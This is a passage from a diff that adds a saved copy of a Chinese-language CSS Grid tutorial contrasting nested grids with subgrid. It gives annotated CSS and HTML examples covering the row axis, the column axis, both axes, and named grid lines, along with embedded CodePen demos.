+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/XWgjXYm(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/XWgjXYm">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>使用 Firefox 浏览器，查看上面的示例，你将看到下图这样的效果：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-348.jpg" alt=""></p>
+
+<p><code>.grid__container--subgrid</code> 是一个<code>subgrid</code>（子网格）， 将为它所跨越的区域采用网格容器的网格轨道（行和列）。在这个示例中，垂直方向有三列，水平方向有两行（<code>grid-row</code>和<code>grid-column</code>属性定义）。</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">2</span></span>fr <span class="number"><span class="number">3</span></span>fr <span class="number"><span class="number">2</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">2</span></span>fr <span class="number"><span class="number">2</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--nested</span></span>,
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">5</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--nested</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/YzQGwoe(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/YzQGwoe">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<h2 class="content-title" data-index="2">嵌套网格和子网格的区别</h2>
+
+<p>在使用网格布局时，可以嵌套网格，一个网格项目可以通过在其上设置 <code>display</code> 为 <code>grid</code> 或 <code>inlie-grid</code>，也可以像上面示例那相设置 <code>inherit</code> 而成为一个网格容器。在该嵌套网格上定义的轨道与父网格没有关系。父网格和嵌套网格都是独立的网格。即使嵌套网格继承父网格的参数（比如轨道），它们依旧是独立的。</p>
+
+<p>如果嵌套网格被定义为一个子网格，即在 <code>grid-template-columns</code> 或 <code>grid-template-rows</code> 设置了值为 <code>subgrid</code>。比如上面示例，在<code>.grid__container--subgrid</code> 上同时设置了<code>grid-template-columns</code>和<code>grid-template-rows</code>值为<code>subgrid</code>，并且该网格也是父网格的一个网格项目，显示使用<code>grid-column</code> 和 <code>grid-rows</code> 让该网格项目跨越三列两行。而它的子元素（子网格中的网格项目）将在合并区域（轨道）上布局。</p>
+
+<p>如下图所示，左侧是一个嵌套网格，右侧是了个子网格。白色网格线构建是一个父网格（也称主网格），红色网格线是嵌套网格，绿色网格线是子网格。从下图中不难发现，左侧的嵌套网格和父网格是两个独立的网格，右侧的子网格和父网格是有关系的，子网格只是父网格的一部分，它被包含在同一个布局中，使用相同的网格轨道和网格线。</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-349.jpg" alt=""></p>
+
+<h2 class="content-title" data-index="2">我们为什么需要子网格</h2>
+
+<p>一个值得深思的问题是，我们可以通过 <code>display</code> 的 <code>grid</code>（或 <code>inline-grid</code>）创建嵌套网格，那为什么还需要 <code>subgrid</code> 属性呢？</p>
+
+<p>前面我们也多次提到过，通过<code>display</code> 的 <code>grid</code> 属性构建子网格存在的问题，<strong>我们所做的任何改变或者在网格容器内构造的任何元素都不会为自己引用父容器</strong>。在一个网格中构建一个网格会产生问题，因为元素开始独立行动，因此我们现在不得不必要地管理两个独立的网格。</p>
+
+<p>在 Level 2 网格之前，传统使用的嵌套网格的另一个问题是，它对响应式网页设计没有应有的灵活性。由于今天市场上充斥着不同的移动设备屏幕，响应性是至关重要的。创建一个嵌套网格有时会使里面的元素溢出网格容器元素的边界之外。因此，需要一个新的属性来满足 Web 开发者的需求。这个新属性就是 <code>subgrid</code>。</p>
+
+<p>我们用下面这样的示例来阐述为什么需要<code>subgrid</code>。</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-350.png" alt=""></p>
+
+<p>上图是我们常见的一个布局模式，一排有多个卡片。每张卡片有一个标题、缩略图和正文。卡片在设计的时候，通常都是完美的，比如说标题长度是确定好的、图片高度是一致的、正文内容是相同的。然而，在生产过程中，事情往往会有一些不同。标题和正文的长度在不同的卡片之间会有很大的差异。这可能会破坏整个行中漂亮均匀的卡片的美感。</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-351.png" alt=""></p>
+
+<p>有一些方法可以解决这个问题，你可以限制允许使用的内容，在元素上设置一个最小高度或高度，以保持对齐，但这些都限制了内容，或者会导致视觉美感被牺牲掉。</p>
+
+<p>你可能相知道 Flexbox 是否是一个可能的解决方案。它们可以让你实现大部分需求，但你可能需要牺牲设计和（或）语义来达到预期的结果。你可以考虑嵌套网格，但问题是每个单独嵌套的网格都不知道其他网格的大小，这意味着轨道不会对齐，这与 Flexbox 的情况相似。</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-352.png" alt=""></p>
+
+<p>虽然卡片排列正确，但设计感就差了。</p>
+
+<p>如果我们使用<code>subgrid</code>呢？<code>subgrid</code>让嵌套的网格容器能够继承父网格轨道的尺寸。如果不继承父网格轨道的尺寸，网格项目就会有独立的尺寸，这与前面提到的 Flexbox 或嵌套网格的例子相同。</p>
+
+<p>由于父网格为三个轨道提供了尺寸，嵌套的子网格将继承父轨道的尺寸，并调整为整个行的最大网格单元。这样一来，项目就排成了一排！</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-353.png" alt=""></p>
+
+<p>比如：</p>
+
+<pre class="css"><code class="css"><span class="tag"><span class="tag">body</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(auto-fill, minmax(min(<span class="number"><span class="number">100</span></span>%, <span class="number"><span class="number">300</span></span>px)</span></span>, <span class="number"><span class="number">1</span></span>fr));</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/jOwMMzJ(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/jOwMMzJ">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>在Firefox浏览器中可以看到<code>subgrid</code>的效果：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-354.jpg" alt=""></p>
+
+<blockquote>
+  <p>**注意，到目前为止，仅 Firefox 浏览器支持 <code>subgrid</code> 属性！ **</p>
+</blockquote>
+
+<h2 class="content-title" data-index="2">如何创建子网格</h2>
+
+<p><strong><a rel="nofollow" href="https://www.w3.org/TR/css-grid-2/#track-sizing" target="_blank">CSS Grid Layout Module Level 2</a></strong> 为 <code>grid-template-columns</code> 和 <code>grid-template-rows</code> 属性引入了两个新值，允许我们在现有的网格容器中建立一个子网格：</p>
+
+<pre class="xml"><code class="xml">grid-template-columns: subgrid <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">line-name-list</span></span>&gt;</span></span>?
+grid-template-rows: subgrid <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">line-name-list</span></span>&gt;</span></span>?
+</code></pre>
+
+<p>关键词 <code>subgrid</code> 表示，嵌套的网格在沿相关轴线所占的部分将使用与它的父网格相同的尺寸。因此，子网格的项目将根据其父网格的轨道尺寸来放置和确定大小。子网格可以沿单个轴（行或列）或沿两个轴采用其父网格的轨道尺寸。</p>
+
+<p>当一个元素的<code>display</code> 值为 <code>grid</code> 或 <code>inline-grid</code>时，就会建立一个独立的网格格式化上下文。一个子网格的内容参与其父网格的格式化上下文，而不会建立一个新的网格格式化上下文。</p>
+
+<p><code>&lt;line-name-list&gt;</code> 的语法定义如下：</p>
+
+<pre class="xml"><code class="xml"><span class="tag"><span class="tag">&lt;<span class="title"><span class="title">line-name-list</span></span>&gt;</span></span> = [ <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">line-names</span></span>&gt;</span></span> | <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">name-repeat</span></span>&gt;</span></span> ]+
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">line-names</span></span>&gt;</span></span>     = '[' <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">custom-ident</span></span>&gt;</span></span>* ']'
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">name-repeat</span></span>&gt;</span></span>    = repeat( [ <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">positive-integer</span></span>&gt;</span></span> | auto-fill ], <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">line-names</span></span>&gt;</span></span>+)
+</code></pre>
+
+<p>如果你在使用网格时使用过 <code>repeat()</code> 函数，有一点需要注意的是，在子网格的背景下使用它时，会有一点不同，因为在这种情况下，只有网格线名被重复。</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/eYRdgNy(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/eYRdgNy">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>子网格在子网格的轴上不会有任何隐含的网格轨道，因为它的网格轨道与父网格的轨道一致。子网格上的网格线编号从<code>1</code>开始，并不跟随父网格的网格线编号：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-355.jpg" alt=""></p>
+
+<p>然而，如果父网格上有任何网格线名称（显式命名的网格线名称），它们将被子网格继承，但也可以提供子网格自己的网格线名称。父网格将不能使用子网格线命名的网格线名称。它们它们只适用于子网格。</p>
+
+<p>比如下面这个示例：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__container"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">nav</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"sidebar"</span></span>&gt;</span></span>Nav Content<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">nav</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">main</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"content"</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">article</span></span>&gt;</span></span>Article Content<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">article</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">aside</span></span>&gt;</span></span>Aside Content<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">aside</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">main</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+</code></pre>
+
+<p>我们可以通过下面的 CSS 让 <code>main</code> 元素内的子元素参与到父网格中，同时也可以为子网格的列分配自己的网格线名称：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> [nav-start] fit-<span class="function"><span class="function">content(<span class="number"><span class="number">200</span></span>px)</span></span> [nav-end content-start] <span class="number"><span class="number">1</span></span>fr  <span class="number"><span class="number">1</span></span>fr [content-end];</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> [nav-start content-start] <span class="number"><span class="number">1</span></span>fr [nav-end content-end];</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.content</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> content-start / content-end;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> content-start / content-end;</span></span></span><span class="value"></span></span> 
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid [article-start] [article-end aside-start] [aside-end];</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid [article-start aside-start] [article-end aside-end]
+}</span></span></span><span class="value"></span></span></span><span class="rule"><span class="value"></span></span></span>
+
+<span class="tag"><span class="tag">article</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> article-start / article-end;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">aside</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> aside-start / aside-end;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/gORwgxr(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/gORwgxr">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>在子网格上声明的网格线名称的数量应该与子网格跨越父网格的行数一致。任何多余的名字都会被忽略。</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-356.jpg" alt=""></p>
+
+<h3 class="content-title" data-index="3">行轴上的子网格</h3>
+
+<p>我们将对一个元素（网格项目）的 <code>grid-template-rows</code> 属性设置为 <code>subgrid</code>，并且定义了明确的列轨道。因此，列轨道的行为与普通的嵌套网格一样，但行与子网格所跨越的两个轨道相联系。</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">6</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, minmax(<span class="number"><span class="number">100</span></span>px, auto)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">6</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/ZEypxLr(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/ZEypxLr">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>子网格（<code>.grid__container--subgrid</code>）在父网格中跨越四列两行（即<code>grid-column: 2 / 6</code> 和 <code>grid-row: 2 / 4</code>），它的列轨道是 <code>grid-template-columns</code> 属性指定的三列，是独立的列网格轨道，它与父网格列轨道是不一致的。而 <code>grid-template-rows</code> 属性的值是 <code>subgrid</code>，它的行网格轨道和父网格相同（跨越区域对应的行网格轨道）。</p>
+
+<h3 class="content-title" data-index="3">列轴上的子网格</h3>
+
+<p>把上面的示例稍作调整，将子网格（<code>.grid__container--subgrid</code>）的 <code>grid-template-columns</code> 值设置为 <code>subgrid</code>。</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">6</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, minmax(<span class="number"><span class="number">100</span></span>px, auto)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">6</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="Subgrid for columns" src="./Grid布局：15-嵌套网格vs子网格_files/YzQGaxK(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/YzQGaxK">
+  Subgrid for columns</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>这个刚好和上面的示例相反，子网格的列轨道继承的父网格的列轨道，而行网格轨道是自己独立的网格轨道：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-358.jpg" alt=""></p>
+
+<h3 class="content-title" data-index="3">两个轴上的子网格</h3>
+
+<p>两个轴上的子网格指的是在子网格（<code>.grid__container--subgrid</code>）的 <code>grid-template-columns</code> 和 <code>grid-template-rows</code> 属性上同时设置值为 <code>subgrid</code>：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">6</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, minmax(<span class="number"><span class="number">100</span></span>px, auto)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">6</span></span>;</span></span></span><span class="value"></span></span>
